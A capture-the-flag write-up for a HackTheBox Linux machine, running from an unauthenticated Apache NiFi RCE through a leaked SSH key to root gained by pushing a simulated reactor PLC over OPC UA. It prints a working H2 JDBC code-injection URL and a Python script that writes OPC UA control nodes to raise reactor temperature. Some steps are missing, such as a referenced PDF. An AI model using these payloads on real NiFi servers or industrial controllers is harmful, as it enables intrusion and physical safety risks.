## Executive Summary

Helix is a medium-difficulty Linux machine on HackTheBox that simulates a real-world Operational Technology (OT) security scenario involving an industrial reactor control system. The attack chain spans three distinct phases: initial access through a vulnerability in an unauthenticated Apache NiFi instance, lateral movement by recovering a leaked SSH private key, and a novel privilege escalation that requires manipulating an OPC UA Programmable Logic Controller (PLC) to satisfy a physical-world precondition before a privileged shell becomes available.

**Attack Chain:**

1. **CVE-2023-34468 (Apache NiFi RCE):** The virtual host `flow.helix.htb` exposes an unauthenticated Apache NiFi 1.21.0 dashboard. NiFi fails to sanitize the JDBC connection URL accepted by the `DBCPConnectionPool` controller service — the backend validator only checks that the field is non-empty, never inspecting its content. This allows an attacker to supply a malicious H2 URL embedding arbitrary Java code via H2's `INIT` and `CREATE ALIAS` mechanisms, achieving remote code execution as the `nifi` service account.

2. **SSH Key Recovery, operator user:** Inside the NiFi installation directory, a support bundle contains a backed-up ED25519 private key for the `operator` system user. This key is used to establish a persistent SSH session and retrieve the user flag.

3. **OPC UA PLC State Manipulation, Root:** The `operator` user is permitted to execute `/usr/local/sbin/helix-maint-console` as root without a password. However, this script only opens a privileged shell when the reactor's physical state satisfies a narrow maintenance window condition (temperature ≥ 295 °C, below the safety trip threshold). The reactor is controlled by an OPC UA PLC server listening on `127.0.0.1:4840`. By port-forwarding this service, setting the PLC to `MAINTENANCE` mode, enabling `TestOverride`, and gradually incrementing `CalibrationOffset`, the attacker drives the simulated reactor into the maintenance window — satisfying the physical precondition and obtaining a root shell.

## Understanding the Environment: OPC UA, PLCs, and the Helix Reactor

Before walking through the exploitation steps, it is important to understand the industrial control system environment that this machine simulates, as the privilege escalation is entirely built around interacting with it correctly.

### What is a PLC?

A **Programmable Logic Controller (PLC)** is a specialised industrial computer designed to control physical machinery — motors, valves, pumps, and in this scenario, a simulated nuclear reactor. A PLC runs a continuous loop:

```
1. Read sensors      (e.g. Temperature, Pressure)
2. Apply control and safety logic to those readings
3. Set outputs       (e.g. insert safety rods, activate emergency cooling)
4. Repeat indefinitely
```

PLCs are the backbone of critical infrastructure: power stations, water treatment plants, chemical refineries, and manufacturing lines. Unlike a general-purpose computer, a PLC's primary responsibility is to enforce **hard safety limits** regardless of operator input. If the reactor temperature exceeds a defined threshold, the PLC trips the reactor and locks out further writes — no override from any connected client will bypass this once the trip activates.

In this challenge, the PLC is a **software simulation** that models a reactor faithfully: it tracks `Temperature` and `Pressure` values, enforces safety thresholds, and implements the same state machine that a real reactor PLC would use.

### What is OPC UA?

**OPC UA (Open Platform Communications — Unified Architecture)** is the modern, vendor-neutral standard communication protocol for industrial control systems. It replaced older, proprietary and insecure protocols and was designed to be:

- **Vendor-neutral** — interoperable across different PLC manufacturers and software vendors
- **Structured** — the PLC's internal variables are exposed as a browsable address space of named "nodes" (analogous to a filesystem, but for live control data)
- **Access-controlled** — each node carries an access level (read-only, write-only, or read/write) enforced at the protocol layer

Connecting to:
```
opc.tcp://127.0.0.1:4840/helix/
```
places you directly on the PLC's control interface — the same interface a legitimate plant operator's workstation, a SCADA system, or a remote engineer's laptop would use in a real industrial setting.

**Key concept:** OPC UA governs only *whether a write request is accepted at the protocol layer*. It does **not** enforce reactor physics or safety rules — that logic lives inside the PLC's own program. A node marked "writable" in OPC UA does not mean a write to it will have any effect on the reactor; it means the PLC will receive the write. What the PLC does with it depends entirely on its internal state machine.

### The Helix Reactor Node Map

The OPC UA server exposes three logical groups of nodes:

| Group | Node | Access | Description |
|---|---|---|---|
| **Reactor Systems** | `Temperature` (ns=2;i=4) | Read-only | Live temperature sensor reading in °C |
| | `Pressure` (ns=2;i=5) | Read-only | Live pressure sensor reading in bar |
| | `CalibrationOffset` (ns=2;i=6) | Writable | Maintenance adjustment value; shifts sensor readings when active |
| | `TripActive` (ns=2;i=10) | Read-only | `TRUE` when the reactor has been automatically shut down |
| **Control Systems** | `Mode` (ns=2;i=12) | Writable | `NORMAL` (default) or `MAINTENANCE` (diagnostic) |
| | `TestOverride` (ns=2;i=13) | Writable | Enables limited diagnostic overrides; only meaningful in `MAINTENANCE` mode |
| | `ResetTrip` (ns=2;i=14) | Writable | Clears a safety trip; only honoured when conditions are genuinely safe |
| **Safety Systems** | `RodsInserted` | Read-only | Set automatically by PLC safety logic; never directly writable |
| | `EmergencyCooling` | Read-only | Set automatically by PLC safety logic; never directly writable |

The PLC enforces its own **internal state machine** on top of OPC UA's access control:

- In `NORMAL` mode, writes to `CalibrationOffset` and `TestOverride` are silently **ignored** by the PLC even though OPC UA marks them as writable.
- To make writes meaningful, the client must first transition the PLC to `MAINTENANCE` mode, then set `TestOverride = TRUE`.
- Once in that state, incrementing `CalibrationOffset` causes `Temperature` and `Pressure` to rise in a controlled, simulated manner.
- A narrow **maintenance operating window** exists: Temperature ≥ 295 °C *or* Pressure ≥ 73 bar, while both remain below the safety trip thresholds (~305 °C / ~75 bar). The `helix-maint-console` script checks whether the reactor is inside this window before granting a privileged shell.
- Crossing the trip thresholds causes `TripActive = TRUE`, which locks out further `CalibrationOffset` writes and closes the maintenance window entirely.

This is the core insight of the privilege escalation: a remotely reachable PLC state — achievable over an SSH tunnel — is the gating condition trusted by a local root-level tool.

## Initial Foothold — CVE-2023-34468 (Apache NiFi RCE)

### Identifying the Service

Browsing to `http://flow.helix.htb/` reveals an **unauthenticated Apache NiFi dashboard**:

<img src="assets/img/helix/apache_nifi_home.png" alt="error loading image">

**Apache NiFi** is an open-source data flow automation platform. It provides a drag-and-drop visual interface for building data pipelines from "processors" — reusable components that can read from databases, execute commands, fetch URLs, and more. NiFi is widely deployed in enterprise environments for ETL pipelines, data ingestion, and log forwarding.

The dashboard exposes the NiFi canvas with two existing processors and one controller service:

- **`ExecuteSQL` processor** — executes SQL queries against a configured database connection.
- **`LogAttribute` processor** — logs FlowFile attributes to NiFi's log output.
- **`MaintenanceDB` controller service** — a `DBCPConnectionPool` (Database Connection Pool) that provides the database connection to `ExecuteSQL`.

Inspecting the `MaintenanceDB` controller service configuration reveals:

<img src="assets/img/helix/nifi_controller_service.png" alt="error loading image">

<img src="assets/img/helix/controller_config.png" alt="error loading image">

| Property | Value |
|---|---|
| Database Connection URL | `jdbc:h2:mem:maint;MODE=MySQL;DB_CLOSE_DELAY=-1` |
| Database Driver Class Name | `org.h2.Driver` |
| Database Driver Location(s) | `/opt/nifi-1.21.0/lib/h2-2.1.214.jar` |

The controller uses **H2 Database Engine** — a lightweight, Java-based in-memory database. The H2 JDBC driver is bundled with NiFi and is accessible at the above path.

Checking the NiFi version via the **About** dialog confirms **Apache NiFi 1.21.0**:

<img src="assets/img/helix/nifi_cve.png" alt="error loading image">

**CVE-2023-34468** is a Remote Code Execution vulnerability affecting Apache NiFi versions 0.0.2 through 1.21.0, classified as **CWE-94 (Code Injection)**.

**Root Cause — Missing Input Validation in the Backend:** The vulnerability is not a feature of H2 itself being inherently dangerous; rather, it is caused by NiFi **failing to validate or sanitize the content of the JDBC URL** provided by the user. In the affected versions, the `DATABASE_URL` property inside `DBCPProperties.java` was validated using only `StandardValidators.NON_EMPTY_VALIDATOR`. This validator does nothing more than confirm the field is not null or empty — it performs no inspection of the URL's content, structure, or the parameters embedded within it.

Because the unvalidated, user-supplied URL was passed directly to the database driver without any content-level checks, an attacker could include H2-specific parameters that the driver would faithfully execute on connection establishment:

- **`INIT`** — an H2 URL parameter that runs arbitrary SQL or DDL statements the moment a connection is opened.
- **`CREATE ALIAS`** — an H2 DDL statement that defines a custom Java method callable from SQL, providing a bridge from SQL to arbitrary Java and therefore to `Runtime.getRuntime().exec()`.

The resulting malicious URL looks like:

```
jdbc:h2:mem:test;INIT=CREATE ALIAS exec AS $$ String exec(String cmd) throws Exception { Runtime.getRuntime().exec(cmd); return null; } $$\;CALL exec('<command>')
```

The fix introduced in NiFi 1.22.0 adds stricter validation that inspects the JDBC URL content and explicitly rejects H2-based connection strings containing dangerous parameters. The patch addressed the lack of sanitization, not H2's feature set.

**Impact:** Because NiFi's web interface was accessible without authentication in version 1.21.0, any unauthenticated attacker on the network could add a malicious `DBCPConnectionPool` controller service, enable it, attach it to an `ExecuteSQL` processor, and trigger code execution as the `nifi` service account — all without any credentials.

**Severity:** CVSS 8.8 (High) — unauthenticated, network-reachable remote code execution.

### Key Finding from Section 7 — Maintenance Operating Window

The decrypted PDF's Section 7 describes the maintenance operating window in detail. This is the critical information required for privilege escalation:

The PLC defines a maintenance operating window where certain diagnostic tools become available. This window opens when **all three** of the following conditions are simultaneously true:

1. **Temperature ≥ ~295 °C OR Pressure ≥ ~73 bar** — only one needs to be true (logical OR). This is the lower boundary, indicating the reactor has moved meaningfully above its normal operating range.

2. **Both values remain below the trip thresholds (~305 °C / ~75 bar)** — crossing either threshold causes the PLC's safety logic to automatically trip the reactor (`TripActive = TRUE`), which closes the window and locks out `CalibrationOffset` writes entirely.

3. **`TripActive` must be `FALSE`** — even if the temperature and pressure are numerically within the correct range, the maintenance window is not considered open if a previous safety trip is still active. The trip must have never occurred, or must have been successfully reset with `ResetTrip`.

```bash
operator@helix:~$ cat /usr/local/sbin/helix-maint-console
#!/bin/bash
set -euo pipefail

FLAG="/opt/helix/state/maintenance_window"

read_until() { cat "$FLAG" 2>/dev/null || true; }

window_ok() {
  [ -f "$FLAG" ] || return 1
  local until_ts now
  until_ts="$(read_until)"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
  return 0
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi

until_ts="$(read_until)"
now="$(date +%s)"
remaining=$((until_ts-now))

echo "[+] Privileged maintenance access granted"
echo "[!] Window expires in ${remaining} seconds"

SCOPE="helix-maint-$$"
systemd-run --quiet --scope --unit="$SCOPE" \
  --property=KillMode=control-group --property=SendSIGHUP=yes \
  /bin/bash -p -i
exit 0
```

**Script analysis:** The script checks for the existence of a file `/opt/helix/state/maintenance_window` and whether the Unix timestamp stored in that file is in the future. If both conditions are met, it launches `/bin/bash -p -i` (an interactive, privilege-preserving bash shell) via `systemd-run` as root. The `-p` flag to bash preserves the effective UID — since `sudo` has already elevated to root, the resulting shell is a root shell.

The file `/opt/helix/state/maintenance_window` is written by the `helix-safety` service when the OPC UA PLC state satisfies the maintenance window conditions. This is the link between the PLC state and the host system's privileged access.

Attempting to run the console immediately confirms the window is not yet open:

```shell

```

### Step 2 — Driving the Reactor into the Maintenance Window

The following script implements the full exploitation sequence. It switches the PLC to `MAINTENANCE` mode, enables `TestOverride`, then incrementally increases `CalibrationOffset` in small steps, reading temperature and pressure after each step. The loop halts as soon as the maintenance window condition is satisfied — before reaching the safety trip threshold.

```python
import asyncio
from asyncua import Client, ua

SERVER_URL = "opc.tcp://127.0.0.1:4840/helix/"

# Node IDs (namespace 2 = urn:helix:ot)
NODES = {
    "Temperature":        "ns=2;i=4",
    "Pressure":           "ns=2;i=5",
    "CalibrationOffset":  "ns=2;i=6",
    "TripActive":         "ns=2;i=10",
    "Mode":                "ns=2;i=12",
    "TestOverride":       "ns=2;i=13",
    "ResetTrip":          "ns=2;i=14",
}

# Safety thresholds from operator guide
TRIP_TEMP = 305.0
TRIP_PRESSURE = 75.0
WINDOW_TEMP = 295.0
WINDOW_PRESSURE = 73.0

# Ramp tuning — small steps, checked every step
STEP = 0.5
POLL_DELAY = 0.5   # seconds between writes/reads
MAX_OFFSET = 40.0  # safety cap so the script doesn't run away

async def write_node(client, node_id, value, variant_type):
    node = client.get_node(node_id)
    dv = ua.DataValue(ua.Variant(value, variant_type))
    await node.write_value(dv)

async def read_node(client, node_id):
    return await client.get_node(node_id).read_value()

async def main():
    client = Client(url=SERVER_URL)
    try:
        await client.connect()
        print("[*] Connected to OPC UA server")

        # Step 1: switch to MAINTENANCE mode
        await write_node(client, NODES["Mode"], "MAINTENANCE", ua.VariantType.String)
        mode = await read_node(client, NODES["Mode"])
        print(f"[*] Mode set to: {mode}")

        # Step 2: enable TestOverride
        await write_node(client, NODES["TestOverride"], True, ua.VariantType.Boolean)
        override = await read_node(client, NODES["TestOverride"])
        print(f"[*] TestOverride: {override}")

        # Step 3: ramp CalibrationOffset gradually, watching Temp/Pressure
        offset = 0.0
        while offset <= MAX_OFFSET:
            offset += STEP
            await write_node(client, NODES["CalibrationOffset"], offset, ua.VariantType.Double)

            await asyncio.sleep(POLL_DELAY)

            temp = await read_node(client, NODES["Temperature"])
            pressure = await read_node(client, NODES["Pressure"])
            trip = await read_node(client, NODES["TripActive"])

            print(f"[+] Offset={offset:.1f} | Temp={temp:.2f}°C | Pressure={pressure:.2f} bar | TripActive={trip}")

            if trip:
                print("[!] TripActive triggered — backing off. Adjust STEP size and retry.")
                break

            if temp >= WINDOW_TEMP or pressure >= WINDOW_PRESSURE:
                if temp < TRIP_TEMP and pressure < TRIP_PRESSURE:
                    print("[+] Hazardous test condition reached — maintenance window should now be OPEN.")
                    print(f"    Final Temp={temp:.2f}°C  Pressure={pressure:.2f} bar")
                    break

        # Step 4: hold state and let you check the HMI / helix-maint-console now
        print("[*] Holding current state. Check HMI or run helix-maint-console now.")
        print("[*] Press Ctrl+C to release connection when done.")
        while True:
            await asyncio.sleep(5)
            temp = await read_node(client, NODES["Temperature"])
            pressure = await read_node(client, NODES["Pressure"])
            trip = await read_node(client, NODES["TripActive"])
            print(f"    [hold] Temp={temp:.2f}°C Pressure={pressure:.2f} bar TripActive={trip}")

    except KeyboardInterrupt:
        print("\n[*] Interrupted by user.")
    finally:
        await client.disconnect()
        print("[*] Disconnected.")

if __name__ == "__main__":
    asyncio.run(main())
```

## Mitigations & Security Recommendations

- **Patch Apache NiFi (CVE-2023-34468):** Upgrade to Apache NiFi 1.22.0 or later, which restricts the JDBC URL schemes and driver paths that can be used in connection pool configurations. Disable unauthenticated access to NiFi by enabling the built-in authentication and authorisation framework.

- **Enable NiFi Authentication:** NiFi 1.21.0 and earlier can be configured to run without any authentication. This should never be the case in any networked deployment. Enable LDAP, OIDC, or certificate-based authentication and enforce HTTPS.

- **Do Not Store SSH Private Keys in Application Directories:** Operator credentials and SSH keys must never be stored in application working directories, support bundle directories, or any location accessible to the service account. Use a dedicated secrets manager or hardware security module (HSM).

- **Implement Strict OPC UA Access Controls:** The OPC UA server should require authentication (username/password or X.509 certificate) for any client attempting to write to control nodes such as `Mode`, `TestOverride`, or `CalibrationOffset`. In a real industrial environment, these nodes should be writable only by explicitly authorised engineering workstations.

- **Restrict Network Access to OPC UA and Internal Services:** Services on port 4840 (OPC UA) and 8081 (HMI) are correctly bound to `127.0.0.1` in this scenario. However, the SSH access granted to `operator` allows port forwarding, which bypasses this control. Restrict SSH port forwarding (`AllowTcpForwarding no` or per-user `no-port-forwarding` in `authorized_keys`) for operator accounts that do not require it.
